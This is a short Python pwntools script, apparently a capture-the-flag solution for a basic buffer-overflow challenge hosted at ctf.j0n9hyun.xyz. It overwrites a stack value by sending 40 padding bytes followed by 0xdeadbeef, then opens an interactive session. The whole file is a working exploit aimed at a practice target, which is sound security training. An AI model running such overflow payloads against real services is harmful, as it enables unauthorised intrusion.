from concurrent.futures import process
from importlib.resources import contents
from multiprocessing import context
from typing import overload
from pwn import * 

context.log_level = 'debug'

#p = process('./bof_basic')
p = remote("ctf.j0n9hyun.xyz", 3000)

offset = 40
overload_addr = 0xdeadbeef

payload = b'A' * offset
payload += p64(overload_addr)

p.sendline(payload)
p.interactive()